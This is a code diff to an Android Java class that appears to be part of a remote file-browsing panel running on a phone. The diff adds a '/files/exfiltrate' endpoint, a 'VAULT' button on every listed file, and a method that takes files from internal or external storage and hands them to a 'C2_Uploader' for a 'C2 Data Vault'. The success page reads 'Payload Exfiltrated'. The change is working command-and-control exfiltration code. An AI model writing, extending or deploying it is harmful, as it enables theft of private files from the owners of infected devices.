@@ -4,6 +4,7 @@ import android.content.Context;
 import android.os.Environment;
 import android.util.Log;
 
+import com.labs.labrats.C2_Uploader;
 import com.labs.labrats.FirebaseConfig;
 
 import java.io.BufferedReader;
@@ -34,6 +35,8 @@ public class DataModule extends BaseModule {
                 return serveFileEdit(uri.substring(12), session);
             } else if (uri.equals("/files/save")) {
                 return saveFile(session);
+            } else if (uri.equals("/files/exfiltrate")) {
+                return exfiltrateToVault(params);
             }
             return serveFiles(uri, params, session);
         } else if (uri.startsWith("/download/")) {
@@ -162,8 +165,8 @@ public class DataModule extends BaseModule {
                         lowerName.endsWith(".xml") || lowerName.endsWith(".html") || lowerName.endsWith(".js") || lowerName.endsWith(".css")) {
                         html.append("<a class=\"btn btn-small\" style=\"margin-right:8px; border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\" href=\"/files/edit/").append(filePath).append("\">EDIT</a>");
                     }
-                    html.append("<a class=\"btn btn-small\" href=\"/download/").append(filePath)
-                            .append("\">GET</a>");
+                    html.append("<a class=\"btn btn-small\" href=\"/download/").append(filePath).append("\">GET</a>");
+                    html.append("<a class=\"btn btn-small\" style=\"margin-left:8px; border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05);\" href=\"/files/exfiltrate?path=").append(filePath).append("\">VAULT</a>");
                 }
 
                 html.append("</li>");
@@ -324,6 +327,25 @@ public class DataModule extends BaseModule {
         html.append("</div>");
         html.append(getFooter());
         return server.serveGzippedProxy(session, "text/html", html.toString());
+    }
+
+    private Response exfiltrateToVault(Map<String, String> params) {
+        String path = params.get("path");
+        if (path == null || path.isEmpty()) return server.serveErrorProxy("Path is missing");
+        
+        File file;
+        if (path.startsWith("INTERNAL/")) {
+            file = new File(context.getFilesDir(), path.substring(9));
+        } else {
+            file = new File(Environment.getExternalStorageDirectory(), path);
+        }
+
+        if (file.exists() && file.isFile()) {
+            C2_Uploader.uploadFile(context, file);
+            String html = getHeader("/files") + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Payload Exfiltrated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p>File queued for C2 Data Vault ingestion: <b>" + escapeHtml(file.getName()) + "</b></p><div style=\"display: flex; justify-content: center;\"><a href=\"javascript:history.back()\" class=\"btn\">Return to Files</a></div></div></div>" + getFooter();
+            return newResponse(Response.Status.OK, "text/html", html);
+        }
+        return server.serveErrorProxy("File not found or invalid");
     }
 
     private Response saveFile(IHTTPSession session) {
